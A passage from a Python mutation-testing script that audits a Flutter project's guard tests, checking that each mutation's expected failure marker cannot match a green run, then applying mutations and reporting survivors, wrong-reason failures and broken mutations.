    # any red suite, and none of them can ever report WRONG-REASON. Both
    # #217 entries carried `'overflow'` -- a substring of `every rule reports
    # a document that overflows the loader` (#238).
    #
    # Read from the json stream rather than from a run's printed output,
    # because that output is machine-dependent in a way this check must not
    # be. Measured 2026-09-22, `flutter test --no-pub --tags guard` piped to
    # a file: no CR bytes, and a longest line that moves with the tree and
    # the checkout path — 199 characters one day, 205 another, with a name
    # visibly cut in one run and whole in the next,
    # so whether a given test's name survives depends on the length of the
    # absolute path printed before it — which differs between this checkout
    # and a runner's. CI's reporter prints them whole. An output-based audit
    # would therefore refuse in one place and pass in the other, which is the
    # machine-dependence #217 was reverted for once already. The json stream
    # carries names and prints entire.
    #
    # The same run is the baseline assertion the battery never had: a suite
    # that is red before any mutation makes every verdict below meaningless.
    print("mutation_check: baseline and marker audit", flush=True)
    # SUITE_SLOW, the superset: a `slow`-tagged test is excluded from the
    # mutation runs, but its name and its prints are in the output of any run
    # that includes it, so auditing the smaller suite leaves them unchecked
    # (#244).
    base = run(SUITE_SLOW + ["--reporter", "json"])
    names: list[str] = []
    printed: list[str] = []
    suites: list[str] = []
    by_id: dict[str, str] = {}
    failed: list[str] = []
    for line in base.stdout.splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            event = json.loads(line)
        except ValueError:
            continue
        kind = event.get("type")
        if kind == "suite":
            # The PATH the runner prints before every test name. A marker
            # naming an unrelated test file passed the audit and scored
            # `caught` for a mutation with nothing to do with it (#250);
            # the relative part of these comes from the source, so checking
            # them is the same verdict everywhere.
            path = event.get("suite", {}).get("path", "")
            if path:
                suites.append(path)
        elif kind == "testStart":
            test = event.get("test", {})
            name = test.get("name", "")
            by_id[str(test.get("id"))] = name
            # `loading <path>` is the runner's own bookkeeping, not a test.
            if name and not name.startswith("loading "):
                names.append(name)
        elif kind == "print":
            # NOTE the environment-sensitivity, because it bit on the first
            # CI run: a print can be CONDITIONAL. `signing_guard_test.dart`
            # prints `... could not be reached` only where the Android SDK is
            # missing, which is true of this battery's job and false on a
            # developer's machine, so `'reached'` was vacuous in CI alone.
            # That is the audit being right rather than flaky -- a marker
            # that a run prints cannot discriminate IN THAT RUN -- and the
            # remedy is a marker distinctive enough that no message contains
            # it, never a looser check here.
            # What a test PRINTS is in a green run's output exactly as a test
            # name is, and a marker matching it is just as vacuous. This is
            # how `'permissions:'` shipped: `permissions_guard_test.dart`
            # prints `release-no-permissions: ... is absent` on every run, so
            # that entry scored `caught` for any red suite at all (#244).
            printed.append(event.get("message", ""))
        elif kind == "testDone" and event.get("result") != "success":
            failed.append(str(event.get("testID")))
    if base.returncode != 0:
        # The NAMES of what failed. This printed the tail of the json stream
        # once, which is progress events and names nothing an operator can act
        # on (#247).
        print("mutation_check: the suite is RED before any mutation, so no "
              "verdict below would mean anything. Failing:", file=sys.stderr)
        for tid in failed or ["(none reported -- run the suite directly)"]:
            print(f"  {by_id.get(tid, tid)}", file=sys.stderr)
        return 2
    if len(names) < 100:
        print(f"mutation_check: the json reporter yielded {len(names)} test "
              f"names, which cannot be right -- the marker audit below would "
              f"pass by reading nothing", file=sys.stderr)
        return 2
    # And every message a guard COULD print, from the source. What actually
    # printed is environment-dependent -- `signing_guard_test.dart`'s
    # `could not be reached` appears only where no Android SDK is installed,
    # which made `'reached'` vacuous in CI and fine locally -- so the audit
    # reads the literals too and is the same verdict everywhere. Conservative
    # by construction: it may flag a marker that only MIGHT be printed, and
    # the remedy for that is a more distinctive marker, which always exists.
    printable: list[str] = []
    for source in sorted((ROOT / "test" / "guards").glob("*.dart")):
        text = source.read_text()
        # `printOnFailure` too: its text lands in the output exactly when the
        # suite is red, which is every run the battery judges. Both quote
        # styles, because Dart has two and the single-quote-only version
        # missed every `print("...")` (#250).
        for call in re.finditer(
                r"(?:print|printOnFailure|markTestSkipped)\(\s*(.*?)\);",
                text, re.S):
            printable.append(" ".join(
                re.findall(r"'([^']*)'|\"([^\"]*)\"", call.group(1))
                and [m[0] or m[1] for m in
                     re.findall(r"'([^']*)'|\"([^\"]*)\"", call.group(1))]
                or []))

    # And the runner's own chrome, which is in every run's output and in
    # none of the sources above: the file path before each name, the loading
    # lines, the counter and the closing line (#250).
    #
    # Both halves of the run, not only the green one. The verdict this audit
    # protects is read from a RED run, so the failure formatter's own
    # vocabulary is the half that matters and was missing: `'Expected:'`
    # passed the audit and then scored `caught` for a mutation it had nothing
    # to do with (#262). These come from package:test's expect formatter and
    # its reporters — a fixed list, written down once with where it came
    # from, rather than discovered one instance per round.
    #
    # Paths are compared RELATIVE to the repository root: the absolute form
    # refuses a marker here and passes it on a runner, which is the
    # machine-dependence the paragraph above says this avoids.
    chrome = [str(pathlib.Path(p).relative_to(ROOT))
              if str(p).startswith(str(ROOT)) else str(p)
              for p in suites] + [
        # package:test's reporters
        "loading ",
        "All tests passed!",
        "Some tests failed.",
        "Skipped tests",
        # package:matcher's failure formatter, present in every red run
        "Expected:",
        "Actual:",
        "Which:",
        "package:matcher",
        "package:flutter_test",
        "Test failed. See exception logs above.",
        # the compact reporter's counter and clock
        "00:0",
        "+0",
        "-1",
    ]

    haystack = [("a test's NAME", n) for n in names]
    haystack += [("what a test PRINTS", t) for t in printed]
    haystack += [("a message a test can print", t) for t in printable]
    haystack += [("the runner's own output", t) for t in chrome]
    vacuous = [
        (m, kind, text)
        for m in selected
        if m.expect
        for kind, text in haystack
        if m.expect in text
    ]
    if vacuous:
        print("mutation_check: these markers are in the output of a GREEN "
              "run, so they are present whether or not the guard fired:",
              file=sys.stderr)
        for m, kind, text in vacuous:
            print(f"  {m.expect!r}  ({m.issue} {m.name})", file=sys.stderr)
            print(f"      matches {kind}: {text.strip()[:110]}", file=sys.stderr)
        print("Use a prefix of the assertion's own reason -- `leak:`, "
              "`overflow:` -- which nothing green prints.", file=sys.stderr)
        return 2
    if args.audit:
        print(f"{len(selected)} markers audited against {len(names)} test "
              f"names, {len(printed)} printed lines, {len(printable)} "
              f"messages a guard can print and {len(chrome)} lines the "
              f"runner itself emits; none of them matches")
        return 0

    print(f"mutation_check: {len(selected)} mutations\n")
    survived: list[Mutation] = []
    wrong: list[Mutation] = []
    broken: list[tuple[Mutation, str]] = []

    for i, m in enumerate(selected, 1):
        edits = [(m.path, m.apply), *m.also]
        targets = [ROOT / path for path, _ in edits]
        originals = [target.read_text() for target in targets]
        label = f"[{i}/{len(selected)}] {m.issue} {m.name}"
        try:
            mutated = [apply(text) for (_, apply), text in zip(edits, originals)]
        except LookupError as exc:
            broken.append((m, str(exc)))
            print(f"  BROKEN  {label}\n          {exc}")
            continue
        if mutated == originals:
            broken.append((m, "changed nothing"))
            print(f"  BROKEN  {label}\n          changed nothing")
            continue

        # The third source of a vacuous marker, and the one no baseline run
        # can show: the mutation's OWN inserted text. A guard that prints the
        # offending line puts that text into the output, so a marker matching
        # it is present because the mutation ran, not because the guard fired
        # (#244).
        if m.expect:
            added = "\n".join(
                line
                for new, old in zip(mutated, originals)
                for line in new.splitlines()
                if line not in old.splitlines()
            )
            if m.expect in added:
                broken.append((m, "the marker is in the text this mutation "
                                  "inserts, so a guard that echoes the "
                                  "offending line satisfies it"))
                print(f"  BROKEN  {label}\n          marker {m.expect!r} is in "
                      f"this mutation's own inserted text")
                continue

        IN_FLIGHT.write_text(
            f"{m.issue} {m.name}\n"
            + "".join(f"  {path}\n" for path, _ in edits)
        )
        for target, text in zip(targets, mutated):
            target.write_text(text)
        try:
            unparseable = [t for t in targets if not parses_as_yaml(t)]
            if unparseable:
                broken.append((m, "left the file unparseable — it would fail for the wrong reason"))
                print(f"  BROKEN  {label}\n          unparseable after mutation")
                continue
            if not compiles_as_dart(targets):
                broken.append((m, "left the Dart unanalyzable — it would fail for the wrong reason"))
                print(f"  BROKEN  {label}\n          does not compile after mutation")
                continue
            suite = list(m.suite) or (SUITE_SLOW if m.slow else SUITE)
            result = run(suite)
            output = result.stdout + result.stderr
            if result.returncode == 0:
                # Re-run before reporting a survivor. A SURVIVED verdict is
                # the one that matters — it says a guard has a hole — and one
                # flaky green would announce a hole that is not there, or
                # worse, be dismissed as flake when it is real. A second
                # green costs one suite run on the rare path only (#192).
                confirm = run(suite)
                if confirm.returncode != 0:
                    output = confirm.stdout + confirm.stderr
                    print(f"  (first run of {label} was green, second was not "
                          f"— reporting the second)")
                else:
                    survived.append(m)
                    print(f"  SURVIVED {label}\n           {m.why}")
            if result.returncode == 0 and m not in survived:
                # Fell through from the flaky branch above; judged on the
                # confirming run's output.
                if m.expect and m.expect not in output:
                    wrong.append(m)
                    print(f"  WRONG-REASON {label}\n               the suite "
                          f"failed, but not with {m.expect!r}")
                else:
                    print(f"  caught  {label}")
            elif result.returncode == 0:
                pass
            elif m.expect and m.expect not in output:
                # Red, but not for this reason. Counting it as caught is how a
                # guard gets credit for an assertion it does not make.
                wrong.append(m)
                print(f"  WRONG-REASON {label}\n               the suite failed, "
                      f"but not with {m.expect!r}")
            else:
                print(f"  caught  {label}")
        finally:
            for target, text in zip(targets, originals):
                target.write_text(text)
            for made in m.creates:
                (ROOT / made).unlink(missing_ok=True)
            IN_FLIGHT.unlink(missing_ok=True)

    print()
    if broken:
        print(f"{len(broken)} mutation(s) could not be applied — the battery is "
              f"testing less than it claims:", file=sys.stderr)
        for m, why in broken:
            print(f"  {m.issue} {m.name}: {why}", file=sys.stderr)
    if wrong:
        print(f"{len(wrong)} mutation(s) failed the suite for the WRONG REASON — "
              f"the named assertion did not fire:", file=sys.stderr)
        for m in wrong:
            print(f"  {m.issue} {m.path}: {m.name} (expected {m.expect!r})",
                  file=sys.stderr)
    if survived:
        print(f"{len(survived)} mutation(s) SURVIVED — the guards do not catch them:",
              file=sys.stderr)
        for m in survived:
            print(f"  {m.issue} {m.path}: {m.name}", file=sys.stderr)
    if broken or survived or wrong:
        return 1 if (survived or wrong) else 2
    print(f"all {len(selected)} mutations caught")
    return 0


if __name__ == "__main__":
    sys.exit(main())
